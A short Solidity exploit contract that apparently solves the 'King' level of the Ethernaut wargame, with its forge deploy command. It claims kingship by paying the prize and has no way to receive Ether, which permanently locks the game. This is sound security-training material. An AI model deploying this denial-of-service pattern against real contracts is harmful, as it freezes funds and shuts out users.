// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../src/levels/09-King/King.sol";
//forge create Newking --private-key $PKEY --rpc-url $RPC_URL --value 1000000000000000wei

contract Newking{
    King level9 = King(payable(0xe77B2E8B72FeA70ba655Af7f8f47f768129dD1bD));
    constructor() public payable{
        address(level9).call{value: level9.prize()}(""); // triggering the receive() function on King contract with the msg.value as prize
    }
}